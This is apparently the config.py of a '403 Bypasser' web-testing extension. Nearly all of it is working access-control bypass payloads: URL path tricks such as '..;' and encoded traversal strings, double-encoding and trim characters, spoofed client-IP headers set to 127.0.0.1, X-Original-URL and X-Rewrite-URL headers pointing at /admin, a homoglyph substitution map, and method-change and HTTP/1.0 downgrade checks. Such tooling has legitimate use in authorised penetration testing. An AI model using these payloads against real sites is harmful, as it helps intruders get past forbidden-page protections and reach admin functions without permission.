# config.py

# --- Default Payloads & Config ---
extentionName = "403 Bypasser"

# Payloads for Query Path manipulation (used by generatePayloads)
defaultQueryPayloads = [
    "%09", "%20", "%23", "%2e", "%2f", "%5c", ".", "..;", "%2e%2e;%2f", ";%09%2f",
    ";%09..%2f", ";%09..;%2f", ";%2f..%2f", "xpto/%2e%2e%2f", "xpto/..%2f", "xpto/..;%2f", "%23/../", "%23/..%2f", "(S(X))", "(S(X))/../(S(X))"
]

# Payloads to be double-encoded for specific tests
payloadsToDoubleEncode = ["%09", "%2e", "%2f", "%5c", ".."]

# Trim characters for specific tests (as Unicode characters)
trimCharsToTest = [u'\u0085', u'\u00A0', u'\u0009', u'\u000C'] # NEL, NBSP, HT, FF

# Headers that might contain paths and should be adapted by the script
HEADERS_WITH_PATHS_TO_ADAPT = {
    "x-original-url",
    "x-override-url",
    "x-rewrite-url"
}

# Default Header Payloads LIST FOR THE UI - PATH-BASED HEADERS REMOVED
defaultHeaderPayloadsForUI = [
    # IP-based headers
    "Base-Url: 127.0.0.1", "CF-Connecting_IP: 127.0.0.1", "CF-Connecting-IP: 127.0.0.1",
    "Client-IP: 127.0.0.1", "Destination: 127.0.0.1", "From: 127.0.0.1", "Host: 127.0.0.1",
    "Http-Url: 127.0.0.1", "Origin: 127.0.0.1", "Proxy: 127.0.0.1", "Proxy-Host: 127.0.0.1",
    "Proxy-Url: 127.0.0.1", "Real-Ip: 127.0.0.1", "Redirect: 127.0.0.1", "Referer: 127.0.0.1",
    "Referrer: 127.0.0.1", "Refferer: 127.0.0.1", "Request-Uri: 127.0.0.1",
    "True-Client-IP: 127.0.0.1", "Uri: 127.0.0.1", "Url: 127.0.0.1", "X-Client-IP: 127.0.0.1",
    "X-Custom-IP-Authorization: 127.0.0.1", "X-Forwarded: 127.0.0.1", "X-Forwarded-By: 127.0.0.1",
    "X-Forwarded-For: 127.0.0.1", "X-Forwarded-For-Original: 127.0.0.1",
    "X-Forwarded-Host: 127.0.0.1", "X-Forwarded-Server: 127.0.0.1", "X-Forwarder-For: 127.0.0.1",
    "X-Forward-For: 127.0.0.1", "X-Host: 127.0.0.1", "X-Http-Destinationurl: 127.0.0.1",
    "X-HTTP-DestinationURL: 127.0.0.1", "X-Http-Host-Override: 127.0.0.1",
    "X-Originally-Forwarded-For: 127.0.0.1", "X-Original-Remote-Addr: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
    "X-Proxy-Url: 127.0.0.1", "X-ProxyUser-Ip: 127.0.0.1", "X-Real-Ip: 127.0.0.1",
    "X-Referrer: 127.0.0.1", "X-Remote-Addr: 127.0.0.1", "X-Remote-IP: 127.0.0.1",
    "X-True-IP: 127.0.0.1", "X-WAP-Profile: 127.0.0.1",
]

# Internal list including path-based headers for the script's logic
internalDefaultHeaderPayloads = defaultHeaderPayloadsForUI + [
    "X-Original-Url: /admin", # Placeholder path
    "X-Original-URL: /admin",
    "X-Override-Url: /admin",
    "X-Rewrite-Url: /admin",
    "X-Rewrite-URL: /admin"
]

# Default False Positives - Start empty for user configuration
defaultFalsePositives = []

# --- Homoglyph Map ---
homoglyphMap = {
    "a": [ u"\u0430", u"\u00e0", u"\u00e1", u"\u1ea1", u"\u0105" ], "c": [ u"\u0441", u"\u0188", u"\u010b" ],
    "d": [ u"\u0501", u"\u0257" ], "e": [ u"\u0435", u"\u1eb9", u"\u0117", u"\u00e9", u"\u00e8" ],
    "g": [ u"\u0121" ], "h": [ u"\u04bb" ], "i": [ u"\u0456", u"\u00ed", u"\u00ec", u"\u00ef" ],
    "j": [ u"\u0458", u"\u029d" ], "k": [ u"\u03ba" ], "l": [ u"\u04cf", u"\u1e37" ], "n": [ u"\u0578" ],
    "o": [ u"\u043e", u"\u03bf", u"\u0585", u"\u022f", u"\u1ecd", u"\u1ecf", u"\u01a1", u"\u00f6", u"\u00f3", u"\u00f2" ],
    "p": [ u"\u0440" ], "q": [ u"\u0566" ], "s": [ u"\u0282" ], "u": [ u"\u03c5", u"\u057d", u"\u00fc", u"\u00fa", u"\u00f9" ],
    "v": [ u"\u03bd", u"\u0475" ], "x": [ u"\u0445", u"\u04b3" ], "y": [ u"\u0443", u"\u00fd" ],
    "z": [ u"\u0290", u"\u017c" ]
}

# Define keys or identifiers for each check module/function
# These should ideally match the module names or function names for easy mapping
QUERY_PAYLOADS_KEY = 'query_payloads.check_standard_query'
HEADER_INJECTION_KEY = 'header_injection.check_headers'
METHOD_CHANGE_KEY = 'method_change.check_post_cl0'
HTTP_DOWNGRADE_KEY = 'http_downgrade.check_http10'
HOMOGLYPH_KEY = 'homoglyph.check_homoglyphs'
EXTRA_SLASH_KEY = 'segment_mods.check_extra_slash'
APPEND_JSON_KEY = 'segment_mods.check_append_json'
UPPERCASE_LAST_KEY = 'segment_mods.check_uppercase_last'
UNICODE_SLASH_KEY = 'segment_mods.check_unicode_slash'
DOUBLE_ENCODE_KEY = 'encoding_mods.check_double_encoding'
TRIM_CHARS_KEY = 'trim_chars.check_trim_chars'
URL_ENCODE_CHAR_KEY = 'encoding_mods.check_char_encoding_url' # Unique key
DOUBLE_URL_ENCODE_CHAR_KEY = 'encoding_mods.check_char_encoding_double_url' # Unique key
UNICODE_ENCODE_CHAR_KEY = 'encoding_mods.check_char_encoding_unicode' # Unique key

# List defining the DEFAULT order and enabled state of checks
# Format: (Display Name, Internal Key, Default Enabled Status)
DEFAULT_CHECKS_CONFIG = [
    ("Query Payloads (Standard)", QUERY_PAYLOADS_KEY, True),
    # ("Header Payloads", HEADER_INJECTION_KEY, True), # <-- Moved from here
    ("Method Change (GET->POST)", METHOD_CHANGE_KEY, True),
    ("HTTP/1.0 Downgrade", HTTP_DOWNGRADE_KEY, True),
    ("Homoglyphs", HOMOGLYPH_KEY, True),
    ("Extra Slash (//)", EXTRA_SLASH_KEY, True),
    ("Append .json", APPEND_JSON_KEY, True),
    ("Uppercase Last Char", UPPERCASE_LAST_KEY, True),
    ("Unicode Slash (%ef%bc%8f)", UNICODE_SLASH_KEY, True),
    ("Double Encode Payloads", DOUBLE_ENCODE_KEY, True),
    ("Trim Characters", TRIM_CHARS_KEY, True),
    ("URL Encode First/Last Char", URL_ENCODE_CHAR_KEY, True),
    ("Double URL Encode First/Last Char", DOUBLE_URL_ENCODE_CHAR_KEY, True),
    ("Unicode Encode First/Last Char", UNICODE_ENCODE_CHAR_KEY, True),
    ("Header Payloads", HEADER_INJECTION_KEY, True), # <-- Moved to here (now last)
]
# --- Keys for saving settings ---
SETTINGS_KEY_ORDER = "check_order_v1"
SETTINGS_KEY_ENABLED = "check_enabled_v1"
